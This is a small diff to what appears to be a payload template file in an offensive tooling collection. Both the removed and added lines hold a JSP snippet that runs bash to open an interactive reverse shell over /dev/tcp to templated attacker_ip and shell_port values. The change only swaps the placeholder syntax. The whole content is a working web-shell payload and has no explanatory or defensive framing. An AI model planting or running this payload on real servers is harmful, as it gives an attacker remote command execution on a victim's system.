@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  <%% Process p; try {p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/<%=$(esh variables/attacker_ip)%>/<%=$(esh variables/shell_port)%> 0>&1"); p.waitFor(); p.destroy();} catch (Exception e) {} %>
+  <% Process p; try {p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{{ attacker_ip }}/{{ shell_port }} 0>&1"); p.waitFor(); p.destroy();} catch (Exception e) {} %>
